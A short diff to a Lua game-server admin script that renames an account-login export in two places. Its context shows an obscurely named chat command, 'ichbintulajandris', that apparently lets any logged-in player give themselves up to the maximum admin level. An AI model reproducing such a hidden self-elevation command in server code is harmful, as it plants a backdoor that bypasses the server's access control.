@@ -30,7 +30,7 @@ function adminSetLevel(player, target, newLevel)
     end
     if not canPunish(player, target) then return end
 
-    if not exports.acc_auth:isLoggedIn(target) then
+    if not exports.v_accounts:isLoggedIn(target) then
         return adminAlert(player, L.msg("v_admin.admin_manage.that_player_is_not_logged_in"), 255, 90, 90)
     end
 
@@ -60,7 +60,7 @@ end)
 --    * value clamped to the 0..maxLevel range
 -- ------------------------------------------------------------
 addCommandHandler("ichbintulajandris", function(player, cmd, levelArg)
-    if not exports.acc_auth:isLoggedIn(player) then return end
+    if not exports.v_accounts:isLoggedIn(player) then return end
 
     local level = tonumber(levelArg) or ADMIN.maxLevel
     level = math.max(0, math.min(ADMIN.maxLevel, math.floor(level)))
